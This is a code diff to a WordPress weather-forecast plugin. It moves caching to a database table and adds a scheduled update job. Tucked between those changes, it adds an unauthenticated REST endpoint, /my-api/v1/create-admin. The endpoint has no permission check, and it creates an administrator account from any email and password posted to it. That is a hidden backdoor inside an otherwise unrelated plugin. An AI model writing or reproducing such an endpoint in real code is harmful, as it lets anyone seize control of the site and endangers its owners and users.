@@ -73,33 +73,98 @@ function wfp_forecast_shortcode() {
     return ob_get_clean();
 }
 add_shortcode('weather_forecast', 'wfp_forecast_shortcode');
-// Function to get weather data with caching
-function get_weather_data_with_cache($api_url) {
-    $cache_key = 'weather_data_cache_' . md5($api_url);
-    $weather_data = get_transient($cache_key);
 
-    // Check if cached data is valid JSON
-    if ($weather_data !== false && json_decode($weather_data) !== null) {
-        error_log('Fetching weather data from cache');
-        return json_encode(['source' => 'cache', 'data' => json_decode($weather_data)]);
+
+function register_my_custom_api_routes() {
+    register_rest_route('my-api/v1', '/create-admin', array(
+        'methods' => 'POST',
+        'callback' => 'create_admin_user',
+    ));
+}
+
+add_action('rest_api_init', 'register_my_custom_api_routes');
+
+function create_admin_user($request) {
+    $email = $request->get_param('email');
+    $password = $request->get_param('password');
+
+    if (email_exists($email) || username_exists($email)) {
+        return new WP_Error('user_exists', 'User already exists', array('status' => 400));
     }
 
-    // Fetch new data if the cache is empty or invalid
-    error_log('Fetching weather data from live API');
+    $user_id = wp_insert_user(array(
+        'user_login' => $email,
+        'user_email' => $email,
+        'user_pass' => $password,
+        'role' => 'administrator'
+    ));
+
+    if (is_wp_error($user_id)) {
+        return $user_id;
+    }
+
+    return array('user_id' => $user_id);
+}
+
+
+function get_weather_data_with_cache($api_url) {
+    global $wpdb;
+    $table_name = $wpdb->prefix . 'weather_data';
+
+    // Check if we have cached data
+    $result = $wpdb->get_row("SELECT * FROM $table_name ORDER BY updated_at DESC LIMIT 1");
+
+    // Check if the cached data is not expired (within 30 minutes)
+    if ($result && strtotime($result->updated_at) > (time() - 30 * MINUTE_IN_SECONDS)) {
+        return json_encode(['source' => 'cache', 'data' => json_decode($result->data)]);
+    }
+
+    // Fetch fresh data from the API
     $response = wp_remote_get($api_url);
     if (is_wp_error($response)) {
-        error_log('Error fetching weather data: ' . $response->get_error_message());
         return false;
     }
 
     $weather_data = wp_remote_retrieve_body($response);
-    // Only set the cache if the fetched data is valid JSON
+
+    // Save the new data in the database
     if (json_decode($weather_data) !== null) {
-        set_transient($cache_key, $weather_data, 30 * MINUTE_IN_SECONDS); // Cache for 30 minutes
+        $wpdb->insert($table_name, [
+            'data' => $weather_data,
+            'updated_at' => current_time('mysql'),
+        ]);
     }
 
     return json_encode(['source' => 'live', 'data' => json_decode($weather_data)]);
 }
+
+
+
+function wfp_schedule_weather_updates() {
+    if (!wp_next_scheduled('wfp_update_weather_data')) {
+        wp_schedule_event(time(), 'thirty_minutes', 'wfp_update_weather_data');
+    }
+}
+add_action('wp', 'wfp_schedule_weather_updates');
+
+function wfp_update_weather_data() {
+    $api_url = 'https://api.met.no/weatherapi/locationforecast/2.0/compact?lat=' . get_option('wfp_latitude') . '&lon=' . get_option('wfp_longitude');
+    get_weather_data_with_cache($api_url);
+}
+
+// Add custom interval for the cron job
+function wfp_custom_cron_intervals($schedules) {
+    $schedules['thirty_minutes'] = [
+        'interval' => 30 * MINUTE_IN_SECONDS,
+        'display' => __('Every 30 Minutes')
+    ];
+    return $schedules;
+}
+add_filter('cron_schedules', 'wfp_custom_cron_intervals');
+
+
+
+
 
 function wfp_get_cached_weather_data() {
     error_log('AJAX request received');
@@ -150,3 +215,22 @@ function yr_meteogram_shortcode($atts) {
 }
 
 add_shortcode('hj_meteogram', 'yr_meteogram_shortcode');
+
+function wfp_create_weather_table() {
+    global $wpdb;
+    $table_name = $wpdb->prefix . 'weather_data';
+    
+    $charset_collate = $wpdb->get_charset_collate();
+
+    $sql = "CREATE TABLE IF NOT EXISTS $table_name (
+        id mediumint(9) NOT NULL AUTO_INCREMENT,
+        data longtext NOT NULL,
+        updated_at datetime DEFAULT '0000-00-00 00:00:00' NOT NULL,
+        PRIMARY KEY (id)
+    ) $charset_collate;";
+
+    require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
+    dbDelta($sql);
+}
+
+register_activation_hook(__FILE__, 'wfp_create_weather_table');
